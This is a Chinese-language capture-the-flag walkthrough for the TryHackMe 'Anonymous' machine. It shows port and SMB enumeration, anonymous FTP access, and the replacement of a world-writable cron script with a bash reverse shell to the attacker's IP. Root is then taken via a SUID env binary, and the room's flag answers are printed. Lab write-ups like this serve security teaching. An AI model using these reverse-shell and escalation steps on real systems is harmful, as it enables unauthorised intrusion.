# 服务发现
```
┌──(root💀kali)-[~/tryhackme/Anonymous]
└─# nmap -sV -Pn 10.10.249.116    
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-18 06:12 EDT
Nmap scan report for 10.10.249.116
Host is up (0.31s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.67 seconds
```

# 分析
只有4个服务端口，没有http，可以先回答前面三个问题

>问题1：Enumerate the machine.  How many ports are open?
>答案：4

>问题2：What service is running on port 21?
>答案：ftp

>问题3：What service is running on ports 139 and 445?
>答案：smb



渗透smb服务,使用enum4linux
```
┌──(root💀kali)-[~/tryhackme/Anonymous]
└─# enum4linux 10.10.249.116                     
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Oct 18 06:29:35 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.249.116
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ========================================== 
|    Share Enumeration on 10.10.249.116    |
 ========================================== 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.249.116
//10.10.249.116/print$  Mapping: DENIED, Listing: N/A
//10.10.249.116/pics    Mapping: OK, Listing: OK
//10.10.249.116/IPC$    [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

```

我们看到有一个```pics```文件夹开启了分享

>问题4：There's a share on the user's computer.  What's it called?
>答案：pics

我们用```smbclient```工具登录到这个文件夹，把上面的文件下载下来分析
```
┌──(root💀kali)-[~/tryhackme/Anonymous]
└─# smbclient  //10.10.249.116/pics                                                                                                                                                                                                   130 ⨯
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 17 07:11:34 2020
  ..                                  D        0  Wed May 13 21:59:10 2020
  corgo2.jpg                          N    42663  Mon May 11 20:43:42 2020
  puppos.jpeg                         N   265188  Mon May 11 20:43:42 2020
```
把jpg文件下载到本地，用```exiftool```命令分析，可以获得文件的描述内容
```Three Pembroke Welsh Corgis side by side outdoors. Approved by Denise Flaim September 2018 and Susan Sprung..Adobe Stock #118102236```

文件的作者：
```Tatyana Panova```

在这里我们起码可以拿到3个用户名：
```
Denise Flaim
Susan Sprung
Tatyana Panova

```

尝试用hrdra爆破上面用户名的ssh，但是无所获。。。


# ftp可以匿名登录，把文件全部下载到本地分析
```
┌──(root💀kali)-[~/tryhackme/Anonymous]
└─# ftp 10.10.249.116
Connected to 10.10.249.116.
220 NamelessOne's FTP Server!
Name (10.10.249.116:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls -alh
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1935 Oct 18 10:20 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt

```

一个个文件分析
文件1：```clean.sh```:
```
┌──(root💀kali)-[~/tryhackme/Anonymous]
└─# cat clean.sh            
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi

```

就是一个清理```/tmp```文件夹下的脚本,不过那个判断貌似永远不会进入else分支，清理记录写入```removed_files.log```.暴露了FTP的目录是``` /var/ftp```

文件2```removed_files.log ```是上面脚本的记录，没有有用的信息

文件3：```to_do.txt```
```
┌──(root💀kali)-[~/tryhackme/Anonymous]
└─# cat to_do.txt        
I really need to disable the anonymous login...it's really not safe

```

我们看到```clean.sh```的权限对于匿名用户是可读可写的，清理临时文件夹这种动作也有可能是某种定时任务，如果我们可以替换这个bash文件，那么我们就有可能拿到反弹shell

# 验证
为了验证bash脚本是一个定时任务，我们修改bash的脚本为：
```
#!/bin/bash
echo "$(date)" >> /var/ftp/scripts/removed_files.log
```

如果新生成的数据显示了日期，那么就可以证实我们的猜想，而且比对两次时间日期可以得到定时任务的频率

# 上传新的bash
```
ftp> put /root/tryhackme/Anonymous/clean.sh ./clean.sh
local: /root/tryhackme/Anonymous/clean.sh remote: ./clean.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
65 bytes sent in 0.00 secs (793.4570 kB/s)

```

# 等两分钟后，下载日志
```
┌──(root💀kali)-[~/tryhackme/Anonymous]
└─# cat removed_files.log  
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Tue Oct 19 07:11:01 UTC 2021
Tue Oct 19 07:12:01 UTC 2021

```

最后两行果然是打印了我们修改的日志信息，而且由时间可以看出定时任务是一分钟执行一次

# shell
编辑```clean.sh```,payload如下
```
#!/bin/bash
bash -i >& /dev/tcp/10.13.21.169/4242 0>&1
```

# 本地开启监听，拿到初始shell
```
┌──(root💀kali)-[~]
└─# nc -lnvp 4242                 
listening on [any] 4242 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.249.116] 59716
bash: cannot set terminal process group (1283): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ id
id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
namelessone@anonymous:~$ whoami
whoami
namelessone
namelessone@anonymous:~$ 

```

在user目录拿到user.txt
```
ls
pics
user.txt
cat user.txt
90d6f992585815ff991e68748c414740
```
>问题5：user.txt
>答案：90d6f992585815ff991e68748c414740

# 提权
把linpeas传到靶机，枚举靶机的提权漏洞，发现一个可以提权的SUID：```env```
利用env提权，拿到root.txt

```
/usr/bin/env /bin/sh -p
whoami
root
cat /root/root.txt
4d930091c31a622a7ed10f27999af363

```

>问题6：root.txt
>答案：4d930091c31a622a7ed10f27999af363


另外，shell用户本身在lxd组用户，关于lxd组用户提权，我在[这台靶机](https://www.jianshu.com/p/d23ae6bba086)里有详细记录，这里不再演示。



